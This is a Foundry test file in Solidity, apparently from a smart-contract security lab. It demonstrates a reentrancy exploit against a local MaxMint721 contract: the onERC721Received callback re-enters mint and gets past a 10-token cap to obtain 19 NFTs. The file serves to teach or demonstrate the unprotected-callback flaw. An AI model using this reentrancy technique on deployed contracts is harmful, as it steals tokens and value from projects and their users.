// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/UnprotectedCallback.sol";

contract MaxMint721Exploit is Test {
    MaxMint721 MaxMint721Contract;
    bool complete;
    uint256 constant MAX_MINTS = 10;

    function setUp() public {
        MaxMint721Contract = new MaxMint721();
    }

    function testSafeMint() public {
        MaxMint721Contract.mint(MAX_MINTS);
        console.log("maxMint bypassed, we got 19 NFTs");
        assertEq(MaxMint721Contract.balanceOf(address(this)), 19);
        console.log("NFT Minted: ", MaxMint721Contract.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        if (!complete) {
            complete = true;
            MaxMint721Contract.mint(MAX_MINTS - 1);
            console.log("Called with : ", MAX_MINTS - 1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
